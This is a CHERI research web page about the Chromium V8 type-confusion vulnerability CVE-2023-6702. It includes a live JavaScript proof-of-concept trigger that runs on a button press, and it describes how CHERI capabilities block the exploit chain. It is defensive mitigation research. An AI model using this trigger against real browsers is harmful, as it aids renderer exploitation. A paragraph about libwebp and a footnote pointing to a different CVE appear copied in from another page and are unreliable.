<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- DO NOT EDIT: file automatically generated by ucampas from
     /auto/homes/rnw24/cheri-website/cam/cheri/index-b.html -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta content="text/html; charset=UTF-8" http-equiv="Content-Type" /><meta content="text/css" http-equiv="Content-Style-Type" /><title>Department of Computer Science and Technology: Chromium Vulnerabilities</title><link rel="stylesheet" type="text/css" media="all" href="style/layout.css" /><link rel="stylesheet" type="text/css" media="print" href="style/print.css" /><link href="style/blue.css" media="all" rel="stylesheet" type="text/css" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style type="text/css">
</style><link href="cheri-publications.html" rel="Next" /><link href="https://www.cl.cam.ac.uk/research/security/ctsrd/" rel="Up" /></head><body class="two-col dept">
<div id="skip"> <a href="index.html#skip-content" accesskey="2">Skip to content</a>&#160;|&#160;<a href="https://www.cam.ac.uk/site/accesskeys.html" accesskey="0">Access key help</a> </div><div id="header">
  <div id="branding"><a href="https://www.cam.ac.uk/" accesskey="1"><img src="images/identifier.svg" alt="University of Cambridge" class="ucam" /></a>
  </div>

    <div id="site-search">

    <form action="https://www.google.co.uk/search" method="get">
      <fieldset>
      <label for="search-term">Search</label>
      <input name="q" type="text" id="search-term" accesskey="4" value="" />
      <input id="search-button" src="images/button-search.gif" value="Search" alt="Search" title="Search" type="image" />
      <input name="domains" type="hidden" value="cam.ac.uk;www.cl.cam.ac.uk" /><input name="sitesearch" type="hidden" value="www.cl.cam.ac.uk" /></fieldset>
    </form>

    <ul><li class="last"><a href="https://www.cl.cam.ac.uk/search/">Advanced search</a></li><li><a href="https://www.cl.cam.ac.uk/az/">A&#8211;Z</a></li><li><a href="https://www.cl.cam.ac.uk/contact/">Contact us</a></li></ul></div>
</div>

<div id="dept-title">
<h1><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/">Department of Computer Science and Technology</a></h1></div>

<div id="container"> <a name="skip-content" id="skip-content"></a>
<ul id="nav-breadcrumb"></ul><ul id="nav-primary"><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/">CTSRD&#160;&#187;</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/news.html">Project news</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/beri/">Bluespec Extensible RISC Implementation (BERI)&#160;&#187;</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/capsicum/">Capsicum&#160;&#8594;</a></div></li><li class="active"><div><a href="index.html">Capability Hardware Enhanced RISC Instructions (CHERI)&#160;&#187;</a></div><ul><li><div><a href="cheri-publications.html">CHERI Publications</a></div></li><li><div><a href="cheri-software.html">CHERI Software Stack</a></div></li><li><div><a href="cheri-formal.html">CHERI Rigorous Engineering</a></div></li><li><div><a href="cheri-llvm.html">CHERI Clang/LLVM and LLD</a></div></li><li><div><a href="cheribsd.html">CheriBSD</a></div></li><li><div><a href="cheri-sel4.html">CHERI-seL4</a></div></li><li><div><a href="cheri-compartmentalization.html">CHERI Software Compartmentalization</a></div></li><li><div><a href="cheri-qemu.html">CHERI-QEMU</a></div></li><li><div><a href="cheri-webkit.html">CHERI-WebKit</a></div></li><li><div><a href="cheri-concentrate/index.html">CHERI Concentrate</a></div></li><li><div><a href="cheri-risc-v.html">CHERI-RISC-V</a></div></li><li><div><a href="cheri-lists.html">CHERI Mailing Lists</a></div></li><li><div><a href="cheri-slack.html">CHERI-CPU Slack</a></div></li><li><div><a href="cheri-projectideas.html">Cambridge student project ideas</a></div></li><li><div><a href="dsbd.html">The Digital Security by Design (DSbD) Initiative</a></div></li><li><div><a href="cheri-morello.html">The Arm Morello Board</a></div></li><li><div><a href="cheri-morello-software.html">CHERI Software for the Arm Morello Board</a></div></li><li><div><a href="cheri-morello-return.html">Arm Morello return programme</a></div></li><li><div><a href="workshops/index.html">CHERI Workshops&#160;&#187;</a></div></li></ul></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/soaap/">Security-Oriented Analysis of Application Programs (SOAAP)&#160;&#187;</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/tesla/">Temporally Enhanced Security Logic Assertions (TESLA)&#160;&#187;</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/smten.html">Enhancing the Satisfiability Modulo Theories Experience (Smten)</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/publications.html">Publications</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/data/">Open Data&#160;&#187;</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/posters-slides.html">Posters and slides</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/people.html">Project members</a></div></li><li><div><a href="https://www.cl.cam.ac.uk/research/security/ctsrd/related.html">Related</a></div></li></ul><div id="content"><div id="content-primary">

<script>
    class CustomPromise extends Promise {
        constructor(executor) {
            super(executor);
        }

        static resolve() {
            return {
                then(resolve, reject) {
                    Promise.resolve().then(BigInt).then(resolve, reject);
                    reject();
                }
            };
        }
    }

    function excercisePoC() {
        document.getElementById("btn6702").style.display = "none"
        CustomPromise.any([1]);
    }
</script>

<h1>CVE-2023-6702</h1>
 
<div>
    <h2>CVE Details</h2>
    <h3>NIST summary</h3>
    <p>"Type confusion in V8 in Google Chrome prior to 120.0.6099.109 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)" <a href="#section1">[1]</a></p>
    <h3>Weakness Enumeration</h3>
    <table>
        <tr>
                <th>CWE-ID</th>
                <th>CWE Name</th>
                <th>Source</th>
        </tr>
        <tr>
                <td>CWE-843</td>
                <td>Access of Resource Using Incompatible Type ('Type Confusion')</td>
                <td>NIST</td>
        </tr>
    </table>

    <h3>Analysis</h3>
    <p>This vulnerability allowed a remote attacker to execute arbitrary code inside the Chrome renderer process.<p>
    <p>There was an insufficient type check in the async stack trace handling code. It leads to a type confusion between <code>FunctionContext</code> and <code>NativeContext</code> (used as a marker to indicate that the closure has ran), causing illegal access to the <code>JSGlobalProxy->hash</code> value. With heap spraying, the attacker was able to inject a fake async stack frame, and construct the fakeobj primitive. Using the fakeobj primitive, the attacker was able to achieve arbitrary code execution in the Chrome renderer process.<p>
    <p>Prerequisites:</P>
    <ul>
        <li>Async stack traces; V8 feature that enriches the stack trace with async frames.</li>
    </ul>
    <h3>History</h3>
    <p>The life span of this vulnerability was over 3 years; this is 1 year longer than the average lifespan of Chromium vulnerabilites (2 years) and less than the average for software generally (4 years). <a href="#section1">[2]</a> <a href="#section3">[3]</a></p>
    <h2>Demonstration</h2>
    <p><b>Note that when porting Chromium to CHERI C/C++ we undertook no actions to identify specific vulnerabilities to mitigate, nor did we make any changes specific to this particular vulnerability.</b></p>
    <p>The baseline FreeBSD arm64 Chromium port replaces Chromium's dependency version of <i>libwep</i> with an updated version of the library from FreeBSD ports system that does not contain this vulnerability. For the purpose of this demonstration we have reverted to the original dependency version of libwebp shipped with Chromium 115.0.5790.100.</p> 
    <h3>Proof Of Concept (PoC)</h3>
    <p>The PoC type utilises confusion between a <code>JSPromise</code> object's Map field and <code>JSGlobalProxy</code>'s hash field, which is an <code>Smi</code>. If one were to use pointer compression, you could heap spray JSPromise objects to match the hash value and then have the hash point to a valid Map  (since it's an integer) and get further along. However, with uncompressed pointers, a <code>Map</code> is in fact a capability and the moment you try to <code>Relaxed_Load</code> from it, you SIGPROT, stopping the exploit chain.</p>
    <p><b>Uncompressed V8</b>: A <code>Map</code> is a capability and can't confuse with <code>Smi</code>, therefore deterministic mitigation (<code>SIGPROT</code>).</p>
    <p><b>Compressed V8</b>: Unclear, but progresses further with heap spraying <code>JSPromise</code> objects to match the hash value and have it point to a valid object.</p>
    <pre>
        <code>
            class CustomPromise extends Promise {
                constructor(executor) {
                    super(executor);
                }

                static resolve() {
                    return {
                        then(resolve, reject) {
                            Promise.resolve().then(BigInt).then(resolve, reject);
                            reject();
                        }
                     };
                 }
             }

             CustomPromise.any([1]);
        </code>
    </pre>
    <button type="button" onclick="excercisePoC()" id="btn6702">Excercise PoC</button>
    <hr>
    <p id="section1">[1] <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1283">CVE-2024-1283 Detail</a></p>
    <p id="section2">[2] <a href="https://www.usenix.org/conference/usenixsecurity22/presentation/alexopoulos">How Long Do Vulnerabilities Live in the Code? A Large-Scale Empirical Measurement Study on FOSS Vulnerability Lifetimes, Nikolaos Alexopoulos, Manuel Brack, Jan Philipp Wagner, Tim Grube, and Max Mühlhäuser, Technical University of Darmstadt</a></p>
    <p id="section3">[3] <a href="https://chromereleases.googleblog.com/2023/12/stable-channel-update-for-desktop_12.html">Advisory</a></p>
</div>


</div></div><ul id="site-info"><li class="copy">&#169; 2010-2019 Robert N. M. Watson<br />Information provided by <a href="https://www.cl.cam.ac.uk/~rnw24/">Robert Watson</a></li></ul></div>
</body></html>
